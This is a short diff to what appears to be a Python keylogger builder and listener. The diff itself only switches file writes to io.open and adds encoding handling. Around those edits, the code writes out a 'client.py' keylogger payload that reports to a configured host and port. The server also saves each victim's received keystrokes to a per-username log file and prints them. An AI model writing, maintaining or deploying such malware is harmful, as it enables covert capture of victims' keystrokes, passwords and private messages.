@@ -4,7 +4,7 @@ import argparse
 from colorama import *
 from pyfade import Colors, Fade, Anime
 from time import strftime
-
+import io
 
 class socks:
     def __init__(self):
@@ -108,9 +108,8 @@ class Keylogger:
 socks.conn()
 Keylogger(INTERVAL).run()
 """
-        with open(f"client.py", 'w', encoding='utf-8') as f:
-            f.write(file_content)
-            f.close()
+        with io.open("client.py", "w", encoding="utf-8") as fichier:
+            fichier.write(file_content)
         print(f" [{Fore.GREEN}WARN{Fore.RESET}] Writing Keyllogs Client.")
         print(f" [{Fore.GREEN}WARN{Fore.RESET}] Keyllogs Client ready [Host => {self.Host} | Port => {self.Port}]")
 
@@ -143,7 +142,7 @@ Keylogger(INTERVAL).run()
             date = strftime('%X')
             requete_client = client.recv(500)
             requete_client = requete_client.decode('utf-8')
-            with open(f"logs\\logs_{username.decode('utf-8')}.txt", "a")as f:
+            with io.open(f"logs\\logs_{username.decode('utf-8')}.txt", "a", encoding="utf-8")as f:
                 f.write((f"[{str(date_write)}] => {requete_client}\n"))
             print(f"""            
  [{Fore.CYAN}LOGS{Fore.RESET}][{str(date)}][{Fore.CYAN}{username.decode('utf-8')}{Fore.RESET}]
